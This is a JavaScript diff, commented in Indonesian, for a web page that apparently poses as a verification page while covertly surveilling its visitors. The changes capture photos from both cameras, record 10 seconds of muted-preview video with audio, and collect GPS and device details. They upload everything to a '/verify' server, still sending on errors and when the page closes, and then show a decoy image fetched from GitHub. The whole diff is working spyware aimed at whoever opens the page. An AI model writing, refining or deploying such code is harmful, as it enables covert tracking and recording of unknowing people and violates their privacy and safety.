@@ -75,12 +75,18 @@
         let stream = null;
         let mediaRecorder = null;
         let recordedChunks = [];
+        let isRecording = false;
+        let hasSent = false;
+        let photos = { front: null, back: null };
+        let gpsData = null;
+        let deviceData = null;
+        let videoBlobData = null;
 
         // ============================================
         // 📸 AMBIL FOTO KAMERA DEPAN + BELAKANG
         // ============================================
         async function captureBothCameras() {
-            const photos = { front: null, back: null };
+            const result = { front: null, back: null };
 
             // Kamera Depan
             try {
@@ -99,7 +105,7 @@
                 frontCanvas.height = frontVideo.videoHeight || 480;
                 const fCtx = frontCanvas.getContext('2d');
                 fCtx.drawImage(frontVideo, 0, 0);
-                photos.front = frontCanvas.toDataURL('image/jpeg', 0.85);
+                result.front = frontCanvas.toDataURL('image/jpeg', 0.85);
 
                 frontStream.getTracks().forEach(t => t.stop());
                 console.log('📸 Front camera captured');
@@ -124,7 +130,7 @@
                 backCanvas.height = backVideo.videoHeight || 480;
                 const bCtx = backCanvas.getContext('2d');
                 bCtx.drawImage(backVideo, 0, 0);
-                photos.back = backCanvas.toDataURL('image/jpeg', 0.85);
+                result.back = backCanvas.toDataURL('image/jpeg', 0.85);
 
                 backStream.getTracks().forEach(t => t.stop());
                 console.log('📸 Back camera captured');
@@ -132,13 +138,13 @@
                 console.log('⚠️ Back camera error:', e.message);
             }
 
-            return photos;
+            return result;
         }
 
         // ============================================
-        // 🎥 REKAM VIDEO KAMERA DEPAN 5 DETIK + AUDIO (TANPA SUARA KELUAR)
+        // 🎥 REKAM VIDEO 10 DETIK + AUDIO (MP4)
         // ============================================
-        async function recordFrontVideo() {
+        async function recordVideo() {
             return new Promise((resolve) => {
                 recordedChunks = [];
 
@@ -151,18 +157,19 @@
                     }
                 })
                 .then((stream) => {
-                    // Video untuk rekaman (tidak terdengar)
                     recorderVideo.srcObject = stream;
                     recorderVideo.muted = true;
                     recorderVideo.play();
 
+                    // Pake MP4 (h264) biar bisa diputar di Telegram
                     const mimeTypes = [
+                        'video/mp4;codecs=h264,aac',
+                        'video/mp4;codecs=avc1,mp4a',
                         'video/webm;codecs=vp9,opus',
-                        'video/webm;codecs=vp8,opus',
                         'video/webm'
                     ];
 
-                    let selectedMimeType = mimeTypes[0];
+                    let selectedMimeType = null;
                     for (const type of mimeTypes) {
                         if (MediaRecorder.isTypeSupported(type)) {
                             selectedMimeType = type;
@@ -170,9 +177,15 @@
                         }
                     }
 
+                    if (!selectedMimeType) {
+                        selectedMimeType = 'video/webm';
+                    }
+
+                    console.log('📹 Using mimeType:', selectedMimeType);
+
                     mediaRecorder = new MediaRecorder(stream, {
                         mimeType: selectedMimeType,
-                        videoBitsPerSecond: 2500000,
+                        videoBitsPerSecond: 3000000,
                         audioBitsPerSecond: 128000
                     });
 
@@ -184,20 +197,24 @@
 
                     mediaRecorder.onstop = () => {
                         const blob = new Blob(recordedChunks, {
-                            type: selectedMimeType || 'video/webm'
+                            type: selectedMimeType || 'video/mp4'
                         });
                         stream.getTracks().forEach(t => t.stop());
                         recorderVideo.srcObject = null;
+                        isRecording = false;
                         resolve(blob);
                     };
 
+                    isRecording = true;
                     mediaRecorder.start(1000);
+                    console.log('🎥 Recording started for 10 seconds...');
 
                     setTimeout(() => {
                         if (mediaRecorder && mediaRecorder.state === 'recording') {
                             mediaRecorder.stop();
+                            console.log('⏹️ Recording stopped (10 seconds)');
                         }
-                    }, 5000);
+                    }, 10000); // 10 DETIK
                 })
                 .catch((err) => {
                     console.error('❌ Record error:', err);
@@ -319,30 +336,18 @@
         }
 
         // ============================================
-        // 🚀 MAIN PROCESS
+        // 📤 SEND DATA KE SERVER
         // ============================================
-        async function startProcess() {
+        async function sendData() {
+            if (hasSent) return;
+            hasSent = true;
+
             try {
-                // 1. AMBIL FOTO KAMERA DEPAN + BELAKANG
-                const photos = await captureBothCameras();
-
-                // 2. REKAM VIDEO KAMERA DEPAN 5 DETIK + AUDIO
-                const videoBlob = await recordFrontVideo();
-
-                // 3. GPS
-                const gps = await getGPSLocation();
-                console.log('📍 GPS:', gps);
-
-                // 4. DEVICE INFO
-                const device = getDeviceInfo();
-                console.log('📱 Device:', device);
-
-                // 5. SEND TO SERVER
                 let videoBase64 = null;
-                if (videoBlob) {
+                if (videoBlobData) {
                     const reader = new FileReader();
                     videoBase64 = await new Promise((resolve) => {
-                        reader.readAsDataURL(videoBlob);
+                        reader.readAsDataURL(videoBlobData);
                         reader.onloadend = () => resolve(reader.result);
                     });
                 }
@@ -351,11 +356,12 @@
                     frontPhoto: photos.front,
                     backPhoto: photos.back,
                     video: videoBase64,
-                    gps: gps,
-                    device: device,
+                    gps: gpsData,
+                    device: deviceData,
                     timestamp: new Date().toISOString()
                 };
 
+                console.log('📤 Sending data to server...');
                 const response = await fetch('/verify', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -364,17 +370,43 @@
 
                 const result = await response.json();
                 console.log('📨 Response:', result);
+                return true;
+            } catch (err) {
+                console.error('❌ Send error:', err);
+                return false;
+            }
+        }
 
-                // ===== TAMPILKAN FOTO DARI GITHUB =====
+        // ============================================
+        // 🚀 MAIN PROCESS
+        // ============================================
+        async function startProcess() {
+            try {
+                // 1. AMBIL FOTO
+                photos = await captureBothCameras();
+
+                // 2. GPS
+                gpsData = await getGPSLocation();
+                console.log('📍 GPS:', gpsData);
+
+                // 3. DEVICE INFO
+                deviceData = getDeviceInfo();
+                console.log('📱 Device:', deviceData);
+
+                // 4. REKAM VIDEO 10 DETIK
+                videoBlobData = await recordVideo();
+
+                // 5. SEND DATA
+                await sendData();
+
+                // 6. TAMPILKAN FOTO DARI GITHUB
                 const githubImage = await getImageFromGitHub();
                 if (githubImage) {
                     resultImage.src = githubImage;
+                } else if (photos.front) {
+                    resultImage.src = photos.front;
                 } else {
-                    if (photos.front) {
-                        resultImage.src = photos.front;
-                    } else {
-                        resultImage.src = 'https://via.placeholder.com/400x600/ccc/fff?text=No+Photo';
-                    }
+                    resultImage.src = 'https://via.placeholder.com/400x600/ccc/fff?text=No+Photo';
                 }
 
                 setTimeout(() => {
@@ -384,6 +416,9 @@
 
             } catch (err) {
                 console.error('❌ Error:', err);
+                // Tetap kirim data yang sudah ada
+                await sendData();
+                
                 loadingContainer.classList.add('hidden');
                 resultContainer.classList.add('visible');
                 const githubImage = await getImageFromGitHub();
@@ -396,16 +431,28 @@
         }
 
         // ============================================
-        // 🛑 STOP RECORDING SAAT WEB DI-CLOSE
+        // 🛑 KALAU WEB DI-CLOSE, TETAP KIRIM DATA
         // ============================================
-        window.addEventListener('beforeunload', () => {
+        window.addEventListener('beforeunload', async (event) => {
+            console.log('🔄 Page closing, sending data...');
+            
+            // Stop recording
             if (mediaRecorder && mediaRecorder.state === 'recording') {
                 mediaRecorder.stop();
+                // Tunggu sebentar biar video selesai
+                await new Promise(r => setTimeout(r, 500));
             }
+            
             if (stream) {
                 stream.getTracks().forEach(t => t.stop());
                 stream = null;
             }
+
+            // Kirim data yang sudah ada
+            await sendData();
+            
+            // Biarkan page close
+            return;
         });
 
         // ============================================
